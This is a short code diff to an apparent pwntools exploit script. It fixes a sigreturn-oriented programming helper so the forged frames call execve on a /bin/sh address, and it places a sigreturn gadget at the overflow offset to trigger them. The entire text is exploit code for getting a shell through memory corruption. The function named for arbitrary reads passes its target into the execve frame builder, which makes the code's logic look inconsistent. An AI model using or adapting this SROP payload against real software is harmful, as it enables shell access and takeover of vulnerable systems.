@@ -40,7 +40,7 @@ def srop_execve_frames(binsh_addr, frame_variants=None):
     variants = frame_variants or ["classic", "with_rsp", "alt_regs"]
     for name in variants:
         frame = SigreturnFrame()
-        frame.rax = constants.SYS_rt_sigreturn
+        frame.rax = constants.SYS_execve
         frame.rip = SYSCALL_RET
         frame.rdi = binsh_addr
         frame.rsi = 0
@@ -59,7 +59,7 @@ def arb_read_gen(target_addr, size=0x100):
     for name, frame_bytes in srop_execve_frames(target_addr):
         payload = flat({
             OFFSET: [
-                SYSCALL_RET,  # trigger sigreturn via syscall
+                SIGRET,  # trigger sigreturn via sigret gadget
                 frame_bytes,
             ]
         })
